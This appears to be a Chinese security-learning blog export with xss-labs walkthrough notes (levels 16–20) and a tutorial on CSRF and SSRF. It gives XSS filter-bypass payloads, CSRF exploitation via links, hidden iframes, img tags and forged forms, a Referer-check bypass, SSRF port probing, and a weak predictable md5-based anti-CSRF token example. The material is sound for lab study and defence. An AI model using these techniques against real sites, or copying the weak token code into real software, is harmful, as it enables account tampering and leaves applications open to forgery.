<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;这只是截取了其中的php代码</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>查看响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131112382.png" alt="image-20200418131112382"></p>
<p>采用回车符%0a进行绕过,触发payload。</p>
<p>payload：<code>&lt;a%0atype=&quot;text&quot;%0aonclick=&quot;alert(1)&quot;&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131643401.png" alt="image-20200418131643401"></p>
<p>提交之后点击图片弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131703210.png" alt="image-20200418131703210"></p>
<h4 id="xss-labs第十七关"><a href="#xss-labs第十七关" class="headerlink" title="xss-labs第十七关"></a>xss-labs第十七关</h4><p>查看响应，发现两个输出点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132402889.png" alt="image-20200418132402889"></p>
<p>可以在这两个输出点上进行尝试</p>
<p>payload：<code>onmouseover=alert(1)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132611943.png" alt="image-20200418132611943"></p>
<p>因为用的是onmouseover所以当鼠标放到图片上时会触发xss从而执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132656388.png" alt="image-20200418132656388"></p>
<h4 id="xss-labs第十八关"><a href="#xss-labs第十八关" class="headerlink" title="xss-labs第十八关"></a>xss-labs第十八关</h4><p>和上一关相同</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418151906701.png" alt="image-20200418151906701"></p>
<p>payload：<code>onmouseover=alert(1)</code></p>
<p>在地址栏输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418152112711.png" alt="image-20200418152112711"></p>
<p>鼠标放到黑色的图片上，弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418152128213.png" alt="image-20200418152128213"></p>
<h4 id="xss-labs第十九关"><a href="#xss-labs第十九关" class="headerlink" title="xss-labs第十九关"></a>xss-labs第十九关</h4><p>flash xss，涉及到反编译，没研究明白</p>
<h4 id="xss-labs第二十关"><a href="#xss-labs第二十关" class="headerlink" title="xss-labs第二十关"></a>xss-labs第二十关</h4><p>flash xss，涉及到反编译，没研究明白</p>
</script></li></ul>]]></content>
  </entry>
  <entry>
    <title>CSRF_SSRF</title>
    <url>/2020/05/03/CSRF_SSRF/</url>
    <content><![CDATA[<h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><h5 id="1、CSRF漏洞定义"><a href="#1、CSRF漏洞定义" class="headerlink" title="1、CSRF漏洞定义"></a>1、CSRF漏洞定义</h5><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 <em>CSRF</em> 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p>
<p>它与XSS非常不同，XSS是利用站点内的信任用户，而CSRF则通过伪装成信任用户请求受信任网站。与XSS相比，CSRF攻击往往不大流行(因此对其进行防御资源也相对较少)也难以防范，所以被认为比XSS更具危害性。</p>
<p>XSS与CSRF区别：</p>
<p>1、XSS利用站点内的信任用户，盗取cookie；</p>
<p>2、CSRF通过伪装成受信任用户请求信任的网站</p>
<h5 id="2、CSRF漏洞原理"><a href="#2、CSRF漏洞原理" class="headerlink" title="2、CSRF漏洞原理"></a>2、CSRF漏洞原理</h5><p>利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430105902911.png" alt="image-20200430105902911"></p>
<h5 id="3、CSRF漏洞代码分析"><a href="#3、CSRF漏洞代码分析" class="headerlink" title="3、CSRF漏洞代码分析"></a>3、CSRF漏洞代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F; 会话验证</span><br><span class="line">	$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">	$money&#x3D;$_GET[&quot;money&quot;];</span><br><span class="line">	&#x2F;&#x2F; 转账操作</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430110119970.png" alt="image-20200430110119970"></p>
<h5 id="CSRF成功利用条件"><a href="#CSRF成功利用条件" class="headerlink" title="CSRF成功利用条件:"></a>CSRF成功利用条件:</h5><ul>
<li><h5 id="用户已经登陆系统"><a href="#用户已经登陆系统" class="headerlink" title="用户已经登陆系统"></a>用户已经登陆系统</h5></li>
<li><h5 id="用户访问对应URL"><a href="#用户访问对应URL" class="headerlink" title="用户访问对应URL"></a>用户访问对应URL</h5></li>
</ul>
<h5 id="4、CSRF漏洞利用"><a href="#4、CSRF漏洞利用" class="headerlink" title="4、CSRF漏洞利用"></a>4、CSRF漏洞利用</h5><p>先修改密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430113712776.png" alt="image-20200430113712776"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430113732750.png" alt="image-20200430113732750"></p>
<p>红线处是更改后的RUL，没有标记的URL是初始URL</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430113957981.png" alt="image-20200430113957981"></p>
<p>访问红线的URL，显示更改了密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430114113340.png" alt="image-20200430114113340"></p>
<p>尝试使用之前的hack登录，发现密码错误了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430114153110.png" alt="image-20200430114153110"></p>
<p>使用123登录尝试一下，发现成功登录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430114225884.png" alt="image-20200430114225884"></p>
<h4 id="无防护的CSRF"><a href="#无防护的CSRF" class="headerlink" title="无防护的CSRF"></a>无防护的CSRF</h4><h5 id="GET型CSRF利用"><a href="#GET型CSRF利用" class="headerlink" title="GET型CSRF利用"></a>GET型CSRF利用</h5><p>构造GET型URL，提交username和password参数，以此来新建对应的用户名和密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430115745538.png" alt="image-20200430115745538"></p>
<p>隐蔽利用img标签的src属性</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430120228504.png" alt="image-20200430120228504"></p>
<p>打开这个URL，显示中奖了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430120436691.png" alt="image-20200430120436691"></p>
<p>在进行查看，成功添加进去了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430120502980.png" alt="image-20200430120502980"></p>
<h5 id="POST型CSRF利用"><a href="#POST型CSRF利用" class="headerlink" title="POST型CSRF利用"></a>POST型CSRF利用</h5><p>设置表单用于提交。例如：<code>&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;111&quot;/&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430121112643.png" alt="image-20200430121112643"></p>
<p>打开url</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430121300333.png" alt="image-20200430121300333"></p>
<p>点击我要中奖了，进行跳转并成功输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430121326257.png" alt="image-20200430121326257"></p>
<h4 id="CSRF漏洞自动化探测"><a href="#CSRF漏洞自动化探测" class="headerlink" title="CSRF漏洞自动化探测"></a>CSRF漏洞自动化探测</h4><h5 id="1、手动探测原理"><a href="#1、手动探测原理" class="headerlink" title="1、手动探测原理"></a>1、手动探测原理</h5><p>手动探测原理在于探测web应用程序具有防止CSRF的措施</p>
<p>防御措施</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430123124772.png" alt="image-20200430123124772"></p>
<p>如果web应用程序的HTTP请求中没有对应的预防措施，那么很大程度上就确定存在CSRF漏洞</p>
<p>手动修改需要修改很多东西。</p>
<h5 id="2、自动化探测工具介绍"><a href="#2、自动化探测工具介绍" class="headerlink" title="2、自动化探测工具介绍"></a>2、自动化探测工具介绍</h5><p>CSRFTester是一款CSRF漏洞测试工具</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430124537202.png" alt="image-20200430124537202"></p>
<h5 id="3、自动化探测工具使用"><a href="#3、自动化探测工具使用" class="headerlink" title="3、自动化探测工具使用"></a>3、自动化探测工具使用</h5><p>1、设置浏览器代理：127.0.0.1:8008</p>
<p>2、登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改表面存在CSRF漏洞</p>
<p>3、生产POC代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133051417.png" alt="image-20200430133051417"></p>
<p>点击截断</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133157442.png" alt="image-20200430133157442"></p>
<p>确定修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133223761.png" alt="image-20200430133223761"></p>
<p>抓取之后进行修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133324502.png" alt="image-20200430133324502"></p>
<p>点击右下角Generate HTML 另存为生成一个POC</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133452407.png" alt="image-20200430133452407"></p>
<p>打开index返回一个true</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133623220.png" alt="image-20200430133623220"></p>
<p>再回到会员页面，成功创建了一个新的会员，由此可以判断页面存在CSRF漏洞，并成功利用这个漏洞添加了用户名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133717157.png" alt="image-20200430133717157"></p>
<h5 id="4、利用CSRF漏洞"><a href="#4、利用CSRF漏洞" class="headerlink" title="4、利用CSRF漏洞"></a>4、利用CSRF漏洞</h5><p>使用服务器搭建CSRF POC访问页面</p>
<p>修改内容，上面还有一个地址也要修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430142101973.png" alt="image-20200430142101973"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430141949387.png" alt="image-20200430141949387"></p>
<p>点击登录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430145441936.png" alt="image-20200430145441936"></p>
<p>登录之后返回true</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430145512344.png" alt="image-20200430145512344"></p>
<p>查看会员列表</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430145532311.png" alt="image-20200430145532311"></p>
<p>如果再次重复提交的话，会报错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430145600654.png" alt="image-20200430145600654"></p>
<h4 id="CSRF漏洞Token防御介绍"><a href="#CSRF漏洞Token防御介绍" class="headerlink" title="CSRF漏洞Token防御介绍"></a>CSRF漏洞Token防御介绍</h4><h5 id="1、漏洞修补逻辑分析"><a href="#1、漏洞修补逻辑分析" class="headerlink" title="1、漏洞修补逻辑分析"></a>1、漏洞修补逻辑分析</h5><p>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作。</p>
<p>原因：用户登录之后服务器就会生成对应的cookie进行身份验证，验证之后就可以进行对应操作，而存在CSRF时用户在点击了构造的CSRF POC那么点击之后发送对应的请求到服务器，服务器接收到cookie（因为用户已经登录），cookie会随着请求一起发送到服务器，服务器确定了他是一个合法用户，但是并不能确定，它是用户自己操作还是用户点击了POC进行操作，而使得这种情况下就存在了CSRF漏洞</p>
<p>如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作。不正确不执行操作。</p>
<p>一般情况下，给予的令牌会写入表单中隐藏域的value值中，随着表单内容进行提交。</p>
<h5 id="2、简单代码模型分析"><a href="#2、简单代码模型分析" class="headerlink" title="2、简单代码模型分析"></a>2、简单代码模型分析</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430150614027.png" alt="image-20200430150614027"></p>
<p>1、首先要有个登录界面login.php，登录成功执行操作，执行登录后的（增删改查）</p>
<p>这个过程中执行这些操作都需要提交对应身份验证的cookie值，有了cookie值才能进行操作，否则连第一步简单操作都无法进行</p>
<p>如果没有登录而直接执行对应的操作，这时候就会自动跳回到登录界面，或者给出其他的提示</p>
<p>远程构造CSRF利用POC，那么直接中招。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF。如果令牌不正确，那么不执行操作。并给出提示内容</p>
<h5 id="3、生成Token代码分析"><a href="#3、生成Token代码分析" class="headerlink" title="3、生成Token代码分析"></a>3、生成Token代码分析</h5><p>Token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">&#x2F;&#x2F; 获取简单的日期（年、月、日）</span><br><span class="line">	$salt&#x3D;&quot;test&quot;.date(&quot;Y&#x2F;m&#x2F;d&quot;);</span><br><span class="line">&#x2F;&#x2F; 进行md5加密</span><br><span class="line">	$token&#x3D;md5($salt);</span><br><span class="line">&#x2F;&#x2F; 返回值</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用函数查看生成的token</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430154552126.png" alt="image-20200430154552126"></p>
<p>在浏览器打开，然后多次运行发现Token值不发生变化</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430154635902.png" alt="image-20200430154635902"></p>
<p>如果生成的Token值都一样就没有防御措施了</p>
<p>为了这种唯一性设置对应的时间，不是年月日，而是<strong>时分秒</strong>，生成字符串不断变化，而且是唯一</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">&#x2F;&#x2F; 获取简单的日期（年、月、日）</span><br><span class="line">	$salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">&#x2F;&#x2F; 进行md5加密</span><br><span class="line">	$token&#x3D;md5($salt);</span><br><span class="line">&#x2F;&#x2F; 返回值</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次在刷新浏览器，发现每一秒的Token值都是不一样的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430155213159.png" alt="image-20200430155213159"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430155222841.png" alt="image-20200430155222841"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430155235926.png" alt="image-20200430155235926"></p>
<p>当前可以将$salt中的test替换成任意的字符串，尽可能复杂而不容易被破解，这个test容易被破解</p>
<p>这样生成的Token就不容易被破解出来，因为是加上当前的时间和字符串的话，如果简单很有可能被猜解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">&#x2F;&#x2F; 获取简单的日期（年、月、日）</span><br><span class="line">	$salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">&#x2F;&#x2F; 进行md5加密</span><br><span class="line">	$token&#x3D;md5($salt);</span><br><span class="line">&#x2F;&#x2F; 返回值</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="4、使用Token进行CSRF漏洞防御"><a href="#4、使用Token进行CSRF漏洞防御" class="headerlink" title="4、使用Token进行CSRF漏洞防御"></a>4、使用Token进行CSRF漏洞防御</h5><p>1、登录验证成功之后，在会话SESSION[“user_token”]中保存Token。</p>
<p>2、在后台操作中，增删改查表单中添加隐藏域hidden，设置value为Token</p>
<p>3、提交之后进行验证Token是否正确。</p>
<p>代码分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	session_start();</span><br><span class="line">	function token_generate()&#123;</span><br><span class="line">		$salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">		$token&#x3D;md5($salt);</span><br><span class="line">		return $token;</span><br><span class="line">	&#125;</span><br><span class="line">	$token&#x3D;token_generate();</span><br><span class="line">	$_SESSION[&quot;USER_TOKEN&quot;]&#x3D;$token;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;CSRF_Token&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;h1&gt;CSRF_Token&lt;&#x2F;h1&gt;</span><br><span class="line">			&lt;form action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;我提交了&quot; &#x2F;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;user_token&quot; value&#x3D;&quot;&lt;?php echo $token;?&gt;&quot; &#x2F;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot; &#x2F;&gt;</span><br><span class="line">			&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/03/CSRF_SSRF/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200430161915623.png" alt="image-20200430161915623"></p>
<p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162134971.png" alt="image-20200430162134971"></p>
<p>F12查看Ntwork</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162202451.png" alt="image-20200430162202451"></p>
<p>点击提交返回successful</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162220524.png" alt="image-20200430162220524"></p>
<p>复制URL和源码进行POC修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162606761.png" alt="image-20200430162606761"></p>
<p>在源码中修改地址，这里的Token和原始的Token是不一样的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162657428.png" alt="image-20200430162657428"></p>
<h4 id="CSRF绕过Referer技巧"><a href="#CSRF绕过Referer技巧" class="headerlink" title="CSRF绕过Referer技巧"></a>CSRF绕过Referer技巧</h4><h5 id="1、Referer防御CSRF原理"><a href="#1、Referer防御CSRF原理" class="headerlink" title="1、Referer防御CSRF原理"></a>1、Referer防御CSRF原理</h5><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p>
<p>当用户点击被构造好的CSRF利用页面，那么执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务器判断Referer值是否与服务器的域名信息有关。如果不相关则不执行操作</p>
<h5 id="2、Referer防御代码编写"><a href="#2、Referer防御代码编写" class="headerlink" title="2、Referer防御代码编写"></a>2、Referer防御代码编写</h5><p>在PHP中使用$_SERVER[‘HTTP_REFERER’]获取页面提交请求中的Referer值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 获取REFERER，用其与相关的字符串比较。例如当前域名xx.com,使用strpos进行包含验证，如果提交的REFERER包含了xx.com那么判断成功。返回True，如果为false，它请求的上一个页面不是xx.com当中的页面，这个时候判断失败。</span><br><span class="line">	if(strpos($_SERVER[&#39;HTTP_REFERER&#39;],&#39;XX.com&#39;)!&#x3D;&#x3D;false)</span><br><span class="line">	&#123;</span><br><span class="line">		判断成功</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		判断失败</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3、绕过Referer技巧"><a href="#3、绕过Referer技巧" class="headerlink" title="3、绕过Referer技巧"></a>3、绕过Referer技巧</h5><p>技巧：如果服务端只判断当前的Referer中是否具有域名，那么直接可以新建文件夹进行绕过。</p>
<p>测试页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430194404169.png" alt="image-20200430194404169"></p>
<p>查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430194441166.png" alt="image-20200430194441166"></p>
<p>在站点目录下新建一个ip的文件夹，将CSRF放在这个文件夹中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430220131544.png" alt="image-20200430220131544"></p>
<p>放进去后需要编辑index内容，这个链接连接到了一个CSRF的绕过，这个链接只判断了referer，这样我们就可以进行绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430220220385.png" alt="image-20200430220220385"></p>
<p>打开这个ip的页面，有1这个超链接进行打开，可以看到burpsuite中抓取到的referer值包含对应的IP地址。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430220433453.png" alt="image-20200430220433453"></p>
<p>请求的页面是csrf_test/referer_test.php，如果不包含对应的ip就不能进行对应的操作。将内容放过</p>
<p>页面返回successful，成功触发了对应的操作</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430220743873.png" alt="image-20200430220743873"></p>
<h5 id="4、Burpsuite自动生成POC"><a href="#4、Burpsuite自动生成POC" class="headerlink" title="4、Burpsuite自动生成POC"></a>4、Burpsuite自动生成POC</h5><p>Burpsuite只有在专业版才能生成POC，社区版不能生成POC</p>
<p>将当前页面提交，然后截断</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430221411622.png" alt="image-20200430221411622"></p>
<p>截断之后在burpsuite右键选择Engaenment tools中的最后一个G开头的，这样就会输出POC代码，复制在一个新文件当中保存进去就行，或者直接使用对应提示进行保存</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430221527972.png" alt="image-20200430221527972"></p>
<h4 id="GET型CSRF漏洞利用方法"><a href="#GET型CSRF漏洞利用方法" class="headerlink" title="GET型CSRF漏洞利用方法"></a>GET型CSRF漏洞利用方法</h4><h5 id="1、链接利用"><a href="#1、链接利用" class="headerlink" title="1、链接利用"></a>1、链接利用</h5><p>在HTML中，a标签代表链接，可以将当前的“页面位置”指引到其他位置。实现跳转的过程</p>
<p>移动的“页面位置”需要发送对应的请求到链接所指向的地址，然后返回响应。</p>
<p><code>&lt;a href=&quot;请求地址，会被http请求到的未知，可以携带GET型参数&quot;&gt;内容&lt;/a&gt;</code></p>
<p><code>&lt;a href=&quot;http://127.0.0.1/csrf_test/get_csrf/new_user.php?username=Mars&amp;password=123456&quot;&gt;请点击我&lt;/a&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501191106058.png" alt="image-20200501191106058"></p>
<h5 id="2、iframe利用"><a href="#2、iframe利用" class="headerlink" title="2、iframe利用"></a>2、iframe利用</h5><p>iframe标签内容将在页面加载 过程中自动进行加载，src指向的位置就是页面请求的位置</p>
<p>注意：可以设置iframe的style -&gt; display:none，以此来不显示iframe加载的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501192508231.png" alt="image-20200501192508231"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195000134.png" alt="image-20200501195000134"></p>
<h5 id="3、img标签利用"><a href="#3、img标签利用" class="headerlink" title="3、img标签利用"></a>3、img标签利用</h5><p>img标签的内容会随着页面加载而被请求，以此src只想的位置会在页面加载过程中进行请求。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195351849.png" alt="image-20200501195351849"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195417245.png" alt="image-20200501195417245"></p>
<h5 id="4、CSS-backgroud利用"><a href="#4、CSS-backgroud利用" class="headerlink" title="4、CSS-backgroud利用"></a>4、CSS-backgroud利用</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195656147.png" alt="image-20200501195656147"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195618215.png" alt="image-20200501195618215"></p>
<h4 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h4><h5 id="1、验证码防御"><a href="#1、验证码防御" class="headerlink" title="1、验证码防御"></a>1、验证码防御</h5><p>验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。</p>
<p>CSRF在用户不知情的情况下弯沉个对应操作，而验证码强制用户与应用程序交互，才能最终完成操作，通常情况下，验证码能够很好地遏制CSRF。</p>
<p>出于用户体验考虑，不可能每一个操作都加入验证码。所以验证码只作为辅助手段，不作为防御CSRF的主要解决方案。</p>
<p>验证码防御也可以被认为是二次验证。</p>
<h5 id="2、Referer-Check防御"><a href="#2、Referer-Check防御" class="headerlink" title="2、Referer Check防御"></a>2、Referer Check防御</h5><p>Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501200632489.png" alt="image-20200501200632489"></p>
<p>缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP。</p>
<h5 id="3、Anti-CSRF-Token防御"><a href="#3、Anti-CSRF-Token防御" class="headerlink" title="3、Anti CSRF Token防御"></a>3、Anti CSRF Token防御</h5><p>CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的</p>
<p>防御措施就是生成一个随机且不被轻易猜测的参数。目前大多是防御都是采用token(不可预测)</p>
<h5 id="4、Token泄露"><a href="#4、Token泄露" class="headerlink" title="4、Token泄露"></a>4、Token泄露</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501201022138.png" alt="image-20200501201022138"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501201116900.png" alt="image-20200501201116900"></p>
<h4 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h4><h5 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h5><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统（正因为请求是由服务端发起的，所以服务端能请求到自身相连而与外网隔离的内部系统）。</p>
<h5 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h5><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等，利用的是服务端的请求伪造。SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器</p>
<h5 id="主要攻击方法"><a href="#主要攻击方法" class="headerlink" title="主要攻击方法"></a>主要攻击方法</h5><ul>
<li>对外网、服务器所在内网、本地进行端口扫描、获取一些服务的banner信息。</li>
<li>攻击运行在内网或本地的应用程序上。</li>
<li>对内网的Web应用进行指纹识别，识别企业内部的资产信息。</li>
<li>攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击（比如：struts2、SQli等）。</li>
<li>利用file协议读取本地文件等。</li>
</ul>
<h5 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h5><p>SSRF漏洞利用的测试地址：<a href="http://127.0.0.1/ssrf.php?url=http://127.0.0.1/2.php" target="_blank" rel="noopener">http://127.0.0.1/ssrf.php?url=http://127.0.0.1/2.php</a></p>
<p>页面ssrf.php实现的功能是获取GET参数URL，然后将URL的内容返回网页上。如果将请求的网址篡改为<a href="http://www,baidu.com，则会显示http://www.baidu.com的页面内容" target="_blank" rel="noopener">http://www,baidu.com，则会显示http://www.baidu.com的页面内容</a></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200503155154844.png" alt="image-20200503155154844"></p>
<p>但是，当设置参数URL为内网地址是，则会泄露内网信息，例如，当URL=192.168.0.2:3306时页面返回“当前地址不允许连接到Mysql服务器”，说明192.168.0.2存在Mysql服务</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200503155403764.png" alt="image-20200503155403764"></p>
